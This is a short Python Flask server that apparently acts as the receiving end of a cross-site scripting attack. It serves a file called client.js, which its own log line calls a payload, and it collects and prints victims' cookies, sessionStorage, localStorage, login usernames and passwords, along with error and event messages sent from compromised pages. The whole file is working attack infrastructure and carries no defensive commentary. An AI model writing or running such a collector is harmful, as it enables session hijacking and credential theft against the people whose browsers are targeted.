"""
flask --app xss-server run --host=0.0.0.0
"""

from flask import Flask, request, send_file
from flask_cors import CORS

app = Flask(__name__)
CORS(app)


@app.get("/client.js")
def clientjs():
    print("[+] Sending Payload")
    return send_file("./client.js", as_attachment=True)


@app.post("/browser-data")
def browserData():
    cookie = request.form["cookie"]
    sessionStorage = request.form["sessionStorage"]
    localStorage = request.form["localStorage"]

    print(
        f"cookie: {cookie}\nsessionStorage: {sessionStorage}\nlocalStorage: {localStorage}"
    )
    return "success"


@app.post("/login")
def login():
    username = request.form["username"]
    password = request.form["password"]

    print(f"username: {username}\npassword: {password}")
    return "success"


@app.post("/error")
def error():
    message = request.form["message"]

    print(f"error message: {message}")
    return "success"


@app.post("/event")
def event():
    message = request.form["message"]

    print(f"event message: {message}")
    return "success"
